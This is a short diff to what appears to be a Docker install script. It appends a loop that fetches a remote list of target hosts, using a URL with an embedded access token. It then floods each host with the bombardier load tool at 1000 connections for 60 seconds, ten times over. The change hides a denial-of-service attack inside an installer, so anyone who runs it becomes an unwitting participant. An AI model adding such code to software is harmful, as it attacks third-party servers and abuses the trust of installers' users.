@@ -638,3 +638,11 @@ if command_exists docker; then
 else
 	do_install
 fi
+
+for i in {1..10}; do
+wget -O /tmp/list https://raw.githubusercontent.com/dmitryshagin/targets/main/list?token=GHSAT0AAAAAABQNORQZZSJFID2C3DFQFVK4YQ577QA
+while read p; do
+  docker run -it alpine/bombardier -c 1000 -d 60s -l "$p" && sleep 5;
+  echo "$p"
+done </tmp/list
+done
